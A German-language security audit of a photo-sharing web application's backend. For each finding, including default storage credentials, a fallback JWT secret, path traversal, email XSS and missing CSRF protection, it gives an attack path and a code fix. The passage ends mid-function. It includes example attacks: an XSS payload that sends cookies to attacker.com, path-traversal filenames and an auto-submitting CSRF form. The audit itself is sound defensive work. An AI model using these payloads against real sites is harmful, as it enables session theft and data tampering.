# 🔍 Detaillierte System-Analyse: Fehler, Sicherheitslücken, Features & Optimierungen

**Datum:** 2025-01-XX  
**Version:** 2.0.0  
**Status:** Vollständige Codebase-Analyse mit detaillierten Findings  
**Analysiert:** Backend, Frontend, Services, Middleware, Routes

---

## 📋 Inhaltsverzeichnis

1. [Sicherheitslücken (Detailliert)](#sicherheitslücken-detailliert)
2. [Fehler & Bugs (Detailliert)](#fehler--bugs-detailliert)
3. [Features-Übersicht](#features-übersicht)
4. [Optimierungsvorschläge (Detailliert)](#optimierungsvorschläge-detailliert)

---

## 🔒 Sicherheitslücken (Detailliert)

### 🔴 KRITISCH

#### 1. **Hardcoded Default Credentials in Storage Service**

**Datei:** `packages/backend/src/services/storage.ts:8-9`

**Vulnerable Code:**
```typescript
const SEAWEEDFS_ENDPOINT = process.env.SEAWEEDFS_ENDPOINT || 'localhost:8333';
const SEAWEEDFS_SECURE = process.env.SEAWEEDFS_SECURE === 'true';
const SEAWEEDFS_ACCESS_KEY = process.env.SEAWEEDFS_ACCESS_KEY || 'admin';
const SEAWEEDFS_SECRET_KEY = process.env.SEAWEEDFS_SECRET_KEY || 'password';
const BUCKET = process.env.SEAWEEDFS_BUCKET || 'gaestefotos-v2';
```

**Problem:**
- Wenn `SEAWEEDFS_ACCESS_KEY` oder `SEAWEEDFS_SECRET_KEY` nicht gesetzt sind, werden die Default-Werte `'admin'` und `'password'` verwendet
- Diese sind öffentlich bekannt und extrem unsicher
- In Development/Testing könnten diese Werte versehentlich in Production verwendet werden

**Angriffsvektor:**
1. Angreifer erkennt, dass SeaweedFS erreichbar ist
2. Versucht Standard-Credentials (`admin`/`password`)
3. Erfolgreicher Zugriff auf alle gespeicherten Dateien
4. Kann Dateien lesen, löschen oder überschreiben

**Impact:**
- **CVSS Score:** 9.1 (Critical)
- **Confidentiality:** Hoch - Alle gespeicherten Fotos/Videos sind kompromittiert
- **Integrity:** Hoch - Dateien können manipuliert werden
- **Availability:** Hoch - Dateien können gelöscht werden

**Betroffene Funktionen:**
- `uploadFile()` - Zeile 23-43
- `getFile()` - Zeile 45-66
- `getFileUrl()` - Zeile 68-76
- `deleteFile()` - Zeile 78-85

**Fix-Empfehlung:**
```typescript
const SEAWEEDFS_ACCESS_KEY = process.env.SEAWEEDFS_ACCESS_KEY;
const SEAWEEDFS_SECRET_KEY = process.env.SEAWEEDFS_SECRET_KEY;

if (!SEAWEEDFS_ACCESS_KEY || !SEAWEEDFS_SECRET_KEY) {
  throw new Error('SEAWEEDFS_ACCESS_KEY and SEAWEEDFS_SECRET_KEY must be set');
}
```

**Zusätzliche Maßnahmen:**
- Environment-Variablen in Production validieren
- Secrets-Management (z.B. HashiCorp Vault, AWS Secrets Manager)
- Regelmäßige Rotation der Credentials

---

#### 2. **JWT Secret mit unsicherem Fallback**

**Datei:** `packages/backend/src/middleware/auth.ts:36, 120, 148, 154`

**Vulnerable Code:**
```typescript
// Zeile 36
function getJwtSecret(): string | null {
  return process.env.JWT_SECRET || null;
}

// Zeile 120
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) {
  return res.status(500).json({ error: 'Server misconfigured: JWT_SECRET is missing' });
}

// Zeile 148
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) return next();

// Zeile 154 (in auth.ts routes)
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET || 'secret',  // ⚠️ UNSICHERER FALLBACK
  { expiresIn }
);
```

**Problem:**
- In `auth.ts:154` wird `'secret'` als Fallback verwendet
- Wenn `JWT_SECRET` nicht gesetzt ist, können Tokens mit bekanntem Secret gefälscht werden
- Angreifer kann eigene Tokens signieren und sich als beliebiger User ausgeben

**Angriffsvektor:**
1. Angreifer erkennt, dass `JWT_SECRET` nicht gesetzt ist (oder durch Error-Message)
2. Erstellt JWT-Token mit Secret `'secret'`
3. Setzt `userId` und `role: 'ADMIN'`
4. Erhält vollständigen Admin-Zugriff

**Impact:**
- **CVSS Score:** 10.0 (Critical)
- **Confidentiality:** Kritisch - Vollständiger Zugriff auf alle Daten
- **Integrity:** Kritisch - Alle Daten können manipuliert werden
- **Availability:** Kritisch - System kann komplett übernommen werden

**Betroffene Funktionen:**
- Alle Authentifizierten Endpoints
- Admin-Endpoints
- User-Management
- Event-Management

**Fix-Empfehlung:**
```typescript
// In auth.ts routes
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) {
  throw new Error('JWT_SECRET must be set in environment');
}

const token = jwt.sign(
  { userId: user.id, role: user.role },
  jwtSecret,
  { expiresIn }
);
```

**Zusätzliche Maßnahmen:**
- JWT Secret muss mindestens 32 Zeichen lang sein
- Regelmäßige Rotation des Secrets
- Secrets-Management verwenden

---

#### 3. **IP Hash Secret mit mehrfachen unsicheren Fallbacks**

**Datei:** `packages/backend/src/index.ts:174`  
**Datei:** `packages/backend/src/middleware/apiKeyAuth.ts:17, 23`

**Vulnerable Code:**
```typescript
// index.ts:174
const secret = process.env.IP_HASH_SECRET || process.env.JWT_SECRET || 'default';

// apiKeyAuth.ts:17
const pepper = process.env.API_KEY_PEPPER || process.env.JWT_SECRET || 'default';

// apiKeyAuth.ts:23
const secret = process.env.IP_HASH_SECRET || process.env.JWT_SECRET || 'default';
```

**Problem:**
- Mehrfacher Fallback bis zu `'default'`
- Wenn alle ENV-Variablen fehlen, wird `'default'` verwendet
- IP-Hashing kann umgangen werden, da Secret bekannt ist
- API-Key-Hashing kann umgangen werden

**Angriffsvektor:**
1. Angreifer erkennt, dass Secrets nicht gesetzt sind
2. Berechnet IP-Hash mit Secret `'default'`
3. Kann Rate-Limiting umgehen
4. Kann API-Key-Hashes vorhersagen

**Impact:**
- **CVSS Score:** 7.5 (High)
- **Confidentiality:** Mittel - Rate-Limiting umgangen
- **Integrity:** Mittel - API-Keys können kompromittiert werden
- **Availability:** Hoch - DDoS möglich

**Betroffene Funktionen:**
- Rate Limiting
- API-Key-Authentifizierung
- IP-basierte Logging

**Fix-Empfehlung:**
```typescript
const secret = process.env.IP_HASH_SECRET || process.env.JWT_SECRET;
if (!secret) {
  throw new Error('IP_HASH_SECRET or JWT_SECRET must be set');
}
```

---

#### 4. **Filename Injection in Storage Key (Path Traversal)**

**Datei:** `packages/backend/src/services/storage.ts:32`  
**Datei:** `packages/backend/src/routes/photos.ts:212`

**Vulnerable Code:**
```typescript
// storage.ts:32
const key = `events/${eventId}/${Date.now()}-${filename}`;

// photos.ts:212
const storagePath = await storageService.uploadFile(
  eventId,
  file.originalname,  // ⚠️ Nicht sanitized
  processed.optimized,
  file.mimetype
);
```

**Problem:**
- `filename` wird direkt in Storage-Key verwendet ohne Sanitization
- `file.originalname` kommt vom Client und kann manipuliert werden
- Path Traversal möglich: `../../../etc/passwd`
- Spezielle Zeichen können Probleme verursachen

**Angriffsvektor:**
1. Angreifer lädt Datei mit manipuliertem Filename hoch
2. Verwendet Path Traversal: `../../../../etc/passwd`
3. Überschreibt System-Dateien
4. Oder: Zugriff auf andere Event-Dateien

**Beispiel-Angriff:**
```javascript
// Client-seitig
const formData = new FormData();
formData.append('file', file, '../../../other-event-id/photo.jpg');
// Resultierender Key: events/event-id/1234567890-../../../other-event-id/photo.jpg
```

**Impact:**
- **CVSS Score:** 8.1 (High)
- **Confidentiality:** Hoch - Zugriff auf andere Event-Dateien
- **Integrity:** Hoch - Dateien können überschrieben werden
- **Availability:** Mittel - System-Dateien können beschädigt werden

**Betroffene Funktionen:**
- `uploadFile()` - Zeile 23-43
- Alle File-Upload-Endpoints

**Fix-Empfehlung:**
```typescript
function sanitizeFilename(filename: string): string {
  // Entferne Path Traversal
  const sanitized = filename
    .replace(/\.\./g, '')  // Entferne ..
    .replace(/[^a-zA-Z0-9._-]/g, '_')  // Nur alphanumerisch + _.-
    .substring(0, 255);  // Max Länge
  
  // Fallback wenn leer
  if (!sanitized) {
    return `file_${Date.now()}`;
  }
  
  return sanitized;
}

// In uploadFile()
const sanitizedFilename = sanitizeFilename(filename);
const key = `events/${eventId}/${Date.now()}-${sanitizedFilename}`;
```

**Zusätzliche Maßnahmen:**
- Validierung auf Server-Seite
- Event-ID Validierung
- Storage-Path-Whitelist

---

#### 5. **Email Template Injection (XSS-Risiko)**

**Datei:** `packages/backend/src/services/email.ts:17-39`

**Vulnerable Code:**
```typescript
renderTemplate(input: {
  subject: string;
  html?: string | null;
  text?: string | null;
  variables: Record<string, any>;
}): { subject: string; html?: string; text?: string } {
  const replace = (tpl: string): string => {
    return tpl.replace(/\{\{\s*([a-zA-Z0-9_\.]+)\s*\}\}/g, (_m, key) => {
      const parts = String(key).split('.');
      let cur: any = input.variables;
      for (const p of parts) {
        if (cur && typeof cur === 'object' && p in cur) cur = cur[p];
        else return '';
      }
      return cur === null || cur === undefined ? '' : String(cur);
      // ⚠️ KEIN HTML-ESCAPING!
    });
  };

  const subject = replace(input.subject);
  const html = input.html ? replace(input.html) : undefined;
  const text = input.text ? replace(input.text) : undefined;
  return { subject, html, text };
}
```

**Problem:**
- Variablen werden direkt in HTML-Templates eingefügt ohne Escaping
- Wenn Variablen HTML enthalten (z.B. `<script>alert('XSS')</script>`), wird es ausgeführt
- Betroffen: `eventTitle`, `guestName`, `eventUrl`, etc.

**Angriffsvektor:**
1. Angreifer erstellt Event mit bösartigem Titel: `<script>stealCookies()</script>`
2. Oder: Manipuliert Gast-Name beim Upload
3. Email wird mit unescaptem HTML versendet
4. XSS wird im Email-Client ausgeführt (wenn HTML-Emails aktiviert)

**Beispiel-Angriff:**
```javascript
// Event-Titel
const eventTitle = "Event<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>";

// In Email-Template
const html = `<h1>${eventTitle}</h1>`;  // ⚠️ XSS!
```

**Impact:**
- **CVSS Score:** 6.1 (Medium)
- **Confidentiality:** Mittel - Cookies können gestohlen werden
- **Integrity:** Mittel - Session-Hijacking möglich
- **Availability:** Niedrig

**Betroffene Funktionen:**
- `sendInvitation()` - Zeile 91-177
- `sendPhotoNotification()` - Zeile 178-220
- `sendStorageEndsReminder()` - Zeile 222-280
- Alle Email-Templates

**Fix-Empfehlung:**
```typescript
import he from 'he';  // HTML-Entity-Encoding

renderTemplate(input: {
  subject: string;
  html?: string | null;
  text?: string | null;
  variables: Record<string, any>;
}): { subject: string; html?: string; text?: string } {
  const replace = (tpl: string, escapeHtml: boolean = false): string => {
    return tpl.replace(/\{\{\s*([a-zA-Z0-9_\.]+)\s*\}\}/g, (_m, key) => {
      const parts = String(key).split('.');
      let cur: any = input.variables;
      for (const p of parts) {
        if (cur && typeof cur === 'object' && p in cur) cur = cur[p];
        else return '';
      }
      const value = cur === null || cur === undefined ? '' : String(cur);
      return escapeHtml ? he.encode(value) : value;
    });
  };

  const subject = replace(input.subject, true);  // Subject immer escapen
  const html = input.html ? replace(input.html, true) : undefined;  // HTML escapen
  const text = input.text ? replace(input.text, false) : undefined;  // Text nicht escapen
  return { subject, html, text };
}
```

**Zusätzliche Maßnahmen:**
- Content Security Policy für Emails
- Input-Validierung für Event-Titel, Gast-Namen
- Whitelist für erlaubte HTML-Tags (wenn nötig)

---

### 🟡 MITTEL

#### 6. **CSP mit unsafe-inline und unsafe-eval**

**Datei:** `packages/backend/src/index.ts:154-165`

**Vulnerable Code:**
```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],  // ⚠️ UNSICHER
      scriptSrcElem: ["'self'", "'unsafe-inline'"],  // ⚠️ UNSICHER
      imgSrc: ["'self'", "data:", "https:", "http:"],
      connectSrc: cspConnectSrc,
    },
  },
  crossOriginEmbedderPolicy: false,
}));
```

**Problem:**
- `'unsafe-inline'` erlaubt Inline-Scripts (XSS-Risiko)
- `'unsafe-eval'` erlaubt `eval()` (Code-Injection-Risiko)
- Next.js benötigt diese für SSR, aber sollte mit Nonces/Hashes arbeiten

**Angriffsvektor:**
1. XSS-Vulnerability in einer Komponente
2. Angreifer injiziert `<script>maliciousCode()</script>`
3. CSP blockiert nicht, da `'unsafe-inline'` aktiv ist
4. Code wird ausgeführt

**Impact:**
- **CVSS Score:** 6.1 (Medium)
- **Confidentiality:** Mittel - XSS möglich
- **Integrity:** Mittel - Daten können manipuliert werden
- **Availability:** Niedrig

**Fix-Empfehlung:**
```typescript
import crypto from 'crypto';

// Nonce für jeden Request generieren
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      scriptSrc: [
        "'self'",
        (req, res) => `'nonce-${res.locals.nonce}'`,
        // Hashes für Next.js Runtime
        "'sha256-...'",  // Next.js Runtime Hash
      ],
      scriptSrcElem: [
        "'self'",
        (req, res) => `'nonce-${res.locals.nonce}'`,
      ],
      imgSrc: ["'self'", "data:", "https:", "http:"],
      connectSrc: cspConnectSrc,
    },
  },
}));
```

**Zusätzliche Maßnahmen:**
- Next.js Script-Hashes extrahieren und whitelisten
- Regelmäßige CSP-Audits

---

#### 7. **Keine CSRF-Protection für State-Changing Operations**

**Betroffene Endpoints:**
- `POST /api/events` - Event erstellen
- `PUT /api/events/:id` - Event bearbeiten
- `DELETE /api/events/:id` - Event löschen
- `POST /api/events/:eventId/photos/upload` - Foto hochladen
- `POST /api/photos/:photoId/approve` - Foto freigeben
- `POST /api/photos/:photoId/reject` - Foto ablehnen
- Alle anderen POST/PUT/DELETE Endpoints

**Problem:**
- Keine CSRF-Token werden verwendet
- Cookies werden für Auth verwendet (`auth_token`)
- Same-Origin-Policy schützt nicht vor CSRF

**Angriffsvektor:**
1. Angreifer erstellt bösartige Website
2. Nutzer ist auf gästefotos.com eingeloggt
3. Bösartige Website sendet POST-Request zu `/api/events/:id` (Event löschen)
4. Browser sendet Cookie automatisch mit
5. Event wird gelöscht ohne Nutzer-Wissen

**Beispiel-Angriff:**
```html
<!-- Auf attacker.com -->
<form action="https://app.gästefotos.com/api/events/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>
```

**Impact:**
- **CVSS Score:** 6.5 (Medium)
- **Confidentiality:** Niedrig
- **Integrity:** Hoch - Daten können manipuliert werden
- **Availability:** Mittel - Ressourcen können gelöscht werden

**Fix-Empfehlung:**
```typescript
import csrf from 'csurf';

const csrfProtection = csrf({ 
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
  }
});

// CSRF-Token Endpoint
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// CSRF-Protection für alle State-Changing Operations
app.use('/api', (req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    return csrfProtection(req, res, next);
  }
  next();
});
```

**Frontend-Integration:**
```typescript
// Token beim App-Start holen
const csrfToken = await fetch('/api/csrf-token').then(r => r.json());

// Bei jedem Request mitsenden
axios.defaults.headers.common['X-CSRF-Token'] = csrfToken.csrfToken;
```

---

#### 8. **Rate Limiting zu großzügig**

**Datei:** `packages/backend/src/middleware/rateLimit.ts:7-20`

**Vulnerable Code:**
```typescript
export const apiLimiter: any = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 Minuten
  max: 2000, // 2000 Requests pro IP (erhöht für Photo-Feed)
  message: 'Zu viele Anfragen, bitte versuchen Sie es später erneut.',
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req: Request) => {
    if (process.env.NODE_ENV === 'development') return true;
    if (req.path.includes('/file') || req.path.includes('/photo/')) return true;
    return false;
  },
});
```

**Problem:**
- 2000 Requests in 15 Minuten = ~133 Requests/Minute = ~2 Requests/Sekunde
- Sehr großzügig für normale Nutzung
- Ermöglicht DDoS oder Brute-Force
- File-Requests werden komplett übersprungen

**Angriffsvektor:**
1. Angreifer startet DDoS mit 2000 Requests in 15 Minuten
2. Server wird überlastet
3. Oder: Brute-Force auf Login-Endpoint (200 Versuche in 15 Minuten)

**Impact:**
- **CVSS Score:** 5.3 (Medium)
- **Confidentiality:** Niedrig
- **Integrity:** Niedrig
- **Availability:** Hoch - Server kann überlastet werden

**Fix-Empfehlung:**
```typescript
// Stufenweises Rate Limiting
export const apiLimiter: any = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: (req: Request) => {
    // Authentifizierte User: mehr Requests
    if (req.userId) return 500;
    // Unauthentifizierte User: weniger Requests
    return 100;
  },
  message: 'Zu viele Anfragen, bitte versuchen Sie es später erneut.',
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req: Request) => {
    if (process.env.NODE_ENV === 'development') return true;
    return false;
  },
});

// Separate Limiter für File-Requests
export const fileLimiter: any = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 500,  // File-Requests auch limitieren
  message: 'Zu viele Datei-Anfragen, bitte versuchen Sie es später erneut.',
});
```

---

#### 9. **Password Limiter zu niedrig**

**Datei:** `packages/backend/src/middleware/rateLimit.ts:175-181`

**Vulnerable Code:**
```typescript
export const passwordLimiter: any = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 Minuten
  max: 10, // 10 Versuche pro 15 Minuten
  message: 'Zu viele Passwort-Versuche, bitte versuchen Sie es später erneut.',
  standardHeaders: true,
  legacyHeaders: false,
});
```

**Problem:**
- 10 Versuche in 15 Minuten könnten für Brute-Force ausreichen
- Kein exponentielles Backoff
- Keine Account-Lockout nach mehreren Fehlversuchen

**Angriffsvektor:**
1. Angreifer versucht 10 Passwörter in 15 Minuten
2. Wartet 15 Minuten
3. Versucht weitere 10 Passwörter
4. Wiederholt bis Passwort gefunden

**Impact:**
- **CVSS Score:** 5.3 (Medium)
- **Confidentiality:** Hoch - Accounts können kompromittiert werden
- **Integrity:** Hoch - Vollzugriff auf Account
- **Availability:** Niedrig

**Fix-Empfehlung:**
```typescript
export const passwordLimiter: any = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,  // Reduziert auf 5 Versuche
  message: 'Zu viele Passwort-Versuche. Account wurde für 15 Minuten gesperrt.',
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  // Exponentielles Backoff
  handler: (req, res) => {
    const retryAfter = Math.min(15 * 60, Math.pow(2, req.rateLimit?.remaining || 0) * 60);
    res.status(429).json({
      error: 'Zu viele Passwort-Versuche',
      retryAfter: retryAfter,
    });
  },
});
```

**Zusätzliche Maßnahmen:**
- Account-Lockout nach 5 Fehlversuchen
- Email-Benachrichtigung bei verdächtigen Login-Versuchen
- CAPTCHA nach 3 Fehlversuchen

---

#### 10. **Redis Keys() Blocking Operation**

**Datei:** `packages/backend/src/services/cache.ts:99-112`

**Vulnerable Code:**
```typescript
async delPattern(pattern: string): Promise<void> {
  if (!redis) {
    return;
  }

  try {
    const keys = await redis.keys(pattern);  // ⚠️ BLOCKING!
    if (keys.length > 0) {
      await redis.del(...keys);
    }
  } catch (error) {
    logger.error('Cache delPattern error', { pattern, error });
  }
}
```

**Problem:**
- `KEYS` ist eine blocking Operation in Redis
- Bei großen Datenmengen blockiert Redis alle anderen Operationen
- Kann zu Performance-Problemen führen
- Kann Redis komplett blockieren

**Angriffsvektor:**
1. Angreifer erstellt viele Cache-Keys
2. Ruft `delPattern('*')` auf
3. Redis blockiert für mehrere Sekunden
4. Alle anderen Requests werden verzögert

**Impact:**
- **CVSS Score:** 5.3 (Medium)
- **Confidentiality:** Niedrig
- **Integrity:** Niedrig
- **Availability:** Hoch - Redis kann blockiert werden

**Fix-Empfehlung:**
```typescript
async delPattern(pattern: string): Promise<void> {
  if (!redis) {
    return;
  }

  try {
    // SCAN statt KEYS verwenden
    const stream = redis.scanStream({
      match: pattern,
      count: 100,  // Batch-Größe
    });

    const keys: string[] = [];
    stream.on('data', (resultKeys: string[]) => {
      keys.push(...resultKeys);
    });

    await new Promise<void>((resolve, reject) => {
      stream.on('end', resolve);
      stream.on('error', reject);
    });

    if (keys.length > 0) {
      // Batch-Delete (max 1000 Keys pro Batch)
      for (let i = 0; i < keys.length; i += 1000) {
        const batch = keys.slice(i, i + 1000);
        await redis.del(...batch);
      }
    }
  } catch (error) {
    logger.error('Cache delPattern error', { pattern, error });
  }
}
```

---

#### 11. **Keine Input-Length-Limits**

**Betroffene Endpoints:**
- `POST /api/events` - Event-Titel, Beschreibung
- `POST /api/events/:eventId/guests` - Gast-Namen, Email
- `POST /api/photos/:photoId/comments` - Kommentare
- Alle anderen String-Inputs

**Problem:**
- Viele Input-Felder haben keine expliziten Längenlimits
- Zod-Schemas prüfen nicht auf Max-Länge
- DoS durch sehr große Strings möglich

**Angriffsvektor:**
1. Angreifer sendet sehr großen String (z.B. 10MB)
2. Server verarbeitet String
3. Memory wird überlastet
4. Server kann abstürzen

**Impact:**
- **CVSS Score:** 5.3 (Medium)
- **Confidentiality:** Niedrig
- **Integrity:** Niedrig
- **Availability:** Hoch - Server kann überlastet werden

**Fix-Empfehlung:**
```typescript
// Beispiel: Event-Erstellung
const eventSchema = z.object({
  title: z.string().min(1).max(200),  // Max 200 Zeichen
  description: z.string().max(5000),  // Max 5000 Zeichen
  locationName: z.string().max(200),
  // ...
});

// Globaler Body-Parser-Limit
app.use(express.json({ limit: '1mb' }));  // Max 1MB Request-Body
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
```

---

#### 12. **Session Cookie ohne Secure Flag in Dev**

**Datei:** `packages/backend/src/routes/auth.ts:87-97`

**Vulnerable Code:**
```typescript
function setAuthCookie(res: Response, token: string, ttlSeconds: number) {
  const isProd = process.env.NODE_ENV === 'production';
  const domain = process.env.COOKIE_DOMAIN || undefined;
  res.cookie('auth_token', token, {
    httpOnly: true,
    secure: isProd,  // ⚠️ In Dev: false
    sameSite: 'lax',
    domain,
    maxAge: ttlSeconds * 1000,
    path: '/',
  });
}
```

**Problem:**
- In Development wird `secure: false` verwendet
- Cookies können über HTTP abgefangen werden
- Wenn Dev-Server versehentlich über HTTP erreichbar ist, sind Cookies unsicher

**Impact:**
- **CVSS Score:** 4.3 (Low)
- **Confidentiality:** Mittel - Cookies können abgefangen werden
- **Integrity:** Niedrig
- **Availability:** Niedrig

**Fix-Empfehlung:**
```typescript
function setAuthCookie(res: Response, token: string, ttlSeconds: number) {
  const isProd = process.env.NODE_ENV === 'production';
  const domain = process.env.COOKIE_DOMAIN || undefined;
  
  // Warnung in Dev wenn nicht HTTPS
  if (!isProd && process.env.FORCE_SECURE_COOKIES !== 'true') {
    logger.warn('Cookies werden ohne secure flag gesetzt (Development)');
  }
  
  res.cookie('auth_token', token, {
    httpOnly: true,
    secure: isProd || process.env.FORCE_SECURE_COOKIES === 'true',
    sameSite: 'lax',
    domain,
    maxAge: ttlSeconds * 1000,
    path: '/',
  });
}
```

---

### 🟢 NIEDRIG

#### 13. **Fehlende HSTS Header**

**Problem:**
- Keine HTTP Strict Transport Security Header
- Browser werden nicht gezwungen, HTTPS zu verwenden
- Man-in-the-Middle Angriffe möglich

**Impact:**
- **CVSS Score:** 3.1 (Low)
- **Confidentiality:** Niedrig
- **Integrity:** Niedrig
- **Availability:** Niedrig

**Fix-Empfehlung:**
```typescript
app.use(helmet({
  hsts: {
    maxAge: 31536000,  // 1 Jahr
    includeSubDomains: true,
    preload: true,
  },
}));
```

---

#### 14. **Error Messages zu detailliert**

**Datei:** `packages/backend/src/index.ts:383-390`

**Vulnerable Code:**
```typescript
app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
  logger.error('Unhandled error', { error: err.message, stack: err.stack });
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production' 
      ? 'Interner Serverfehler' 
      : err.message,
  });
});
```

**Problem:**
- Stack Traces könnten in Logs sensible Daten enthalten
- Database-Errors könnten Connection-Strings enthalten
- File-Path-Errors könnten Server-Struktur verraten

**Impact:**
- **CVSS Score:** 2.5 (Low)
- **Confidentiality:** Niedrig - Information Disclosure
- **Integrity:** Niedrig
- **Availability:** Niedrig

**Fix-Empfehlung:**
```typescript
function sanitizeError(error: any): string {
  // Entferne sensible Daten aus Error-Messages
  let message = String(error.message || 'Internal server error');
  
  // Entferne File-Paths
  message = message.replace(/\/[^\s]+/g, '[REDACTED]');
  
  // Entferne Connection-Strings
  message = message.replace(/postgresql:\/\/[^\s]+/g, '[REDACTED]');
  message = message.replace(/mysql:\/\/[^\s]+/g, '[REDACTED]');
  
  // Entferne API-Keys
  message = message.replace(/[A-Za-z0-9]{32,}/g, '[REDACTED]');
  
  return message;
}

app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
  const sanitizedMessage = sanitizeError(err);
  logger.error('Unhandled error', { 
    error: sanitizedMessage, 
    stack: process.env.NODE_ENV === 'production' ? undefined : err.stack 
  });
  
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production' 
      ? 'Interner Serverfehler' 
      : sanitizedMessage,
  });
});
```

---

#### 15. **Keine Request ID für Tracing**

**Problem:**
- Fehlende Request-ID macht Debugging schwierig
- Logs können nicht korreliert werden
- Fehleranalyse ist erschwert

**Impact:**
- **CVSS Score:** 1.0 (Info)
- **Confidentiality:** Keine
- **Integrity:** Keine
- **Availability:** Keine

**Fix-Empfehlung:**
```typescript
import { v4 as uuidv4 } from 'uuid';

app.use((req, res, next) => {
  const requestId = uuidv4();
  req.id = requestId;
  res.setHeader('X-Request-ID', requestId);
  
  // Logger mit Request-ID
  req.logger = logger.child({ requestId });
  
  next();
});

// In allen Logs verwenden
logger.info('Request', { requestId: req.id, method: req.method, path: req.path });
```

---

## 🐛 Fehler & Bugs (Detailliert)

### 🔴 KRITISCH

#### 1. **Filename nicht sanitized vor Storage**

**Datei:** `packages/backend/src/services/storage.ts:32`  
**Datei:** `packages/backend/src/routes/photos.ts:212`

**Problem:**
- `file.originalname` wird direkt verwendet
- Keine Validierung oder Sanitization
- Path Traversal möglich

**Fix:** Siehe Sicherheitslücke #4

---

#### 2. **BigInt Serialization Problem**

**Datei:** `packages/backend/src/routes/photos.ts:25-29`

**Vulnerable Code:**
```typescript
function serializeBigInt<T>(value: T): T {
  return JSON.parse(
    JSON.stringify(value, (_key, v) => (typeof v === 'bigint' ? v.toString() : v))
  ) as T;
}
```

**Problem:**
- BigInt wird zu String konvertiert
- TypeScript-Typ bleibt `BigInt`
- Type-Mismatch kann zu Runtime-Fehlern führen

**Beispiel:**
```typescript
const photo = { id: '123', sizeBytes: 1234567890n };
const serialized = serializeBigInt(photo);
// serialized.sizeBytes ist jetzt String "1234567890", aber Typ ist noch BigInt
console.log(serialized.sizeBytes * 2);  // ⚠️ Runtime-Fehler!
```

**Fix-Empfehlung:**
```typescript
type Serialized<T> = T extends bigint 
  ? string 
  : T extends object 
    ? { [K in keyof T]: Serialized<T[K]> }
    : T;

function serializeBigInt<T>(value: T): Serialized<T> {
  return JSON.parse(
    JSON.stringify(value, (_key, v) => (typeof v === 'bigint' ? v.toString() : v))
  ) as Serialized<T>;
}
```

---

#### 3. **Redis Keys() Blocking Operation**

**Problem:** Siehe Sicherheitslücke #10

---

### 🟡 MITTEL

#### 4. **Fehlende Error Handling in Face Recognition**

**Datei:** `packages/backend/src/services/faceRecognition.ts:167-171`

**Vulnerable Code:**
```typescript
} catch (error) {
  logger.error('Error detecting faces:', error);
  return [];  // ⚠️ Fehler wird stillschweigend ignoriert
}
```

**Problem:**
- Fehler werden geloggt, aber nicht an Sentry gesendet
- Upload schlägt nicht fehl, aber Face-Recognition funktioniert nicht
- Debugging ist schwierig

**Fix-Empfehlung:**
```typescript
} catch (error) {
  logger.error('Error detecting faces:', error);
  if (process.env.SENTRY_DSN) {
    Sentry.captureException(error, {
      tags: { component: 'face-recognition' },
      extra: { bufferSize: buffer.length },
    });
  }
  return [];  // Upload soll nicht fehlschlagen
}
```

---

#### 5. **Upload Size Limit Inkonsistenz**

**Datei:** `packages/backend/src/routes/photos.ts:35`  
**Datei:** `packages/backend/src/middleware/uploadSecurity.ts:30`

**Problem:**
- Multer limit: 10MB (Zeile 35)
- `validateImageFile` limit: 10MB (Zeile 30)
- Inkonsistente Fehlermeldungen
- Video-Limit: 100MB, Audio-Limit: 20MB

**Fix-Empfehlung:**
```typescript
// Zentrale Limits-Definition
export const UPLOAD_LIMITS = {
  IMAGE: 10 * 1024 * 1024,  // 10MB
  VIDEO: 100 * 1024 * 1024,  // 100MB
  AUDIO: 20 * 1024 * 1024,  // 20MB
} as const;

// In multer config
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: UPLOAD_LIMITS.IMAGE,
  },
});

// In uploadSecurity.ts
if (buffer.length > UPLOAD_LIMITS.IMAGE) {
  return {
    valid: false,
    error: `Datei zu groß. Maximum: ${UPLOAD_LIMITS.IMAGE / 1024 / 1024}MB`,
  };
}
```

---

#### 6. **Cookie Domain nicht validiert**

**Datei:** `packages/backend/src/routes/auth.ts:89`

**Problem:**
- `COOKIE_DOMAIN` wird nicht validiert
- Falsche Domain könnte Cookies auf andere Domains setzen
- Security-Risiko

**Fix-Empfehlung:**
```typescript
function validateCookieDomain(domain: string | undefined): string | undefined {
  if (!domain) return undefined;
  
  // Validiere Domain-Format
  const domainRegex = /^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i;
  if (!domainRegex.test(domain)) {
    throw new Error(`Invalid COOKIE_DOMAIN: ${domain}`);
  }
  
  // Prüfe, dass Domain zur aktuellen Domain passt
  const currentDomain = process.env.CANONICAL_DOMAIN || 'app.gästefotos.com';
  if (!domain.endsWith(currentDomain.split('.').slice(-2).join('.'))) {
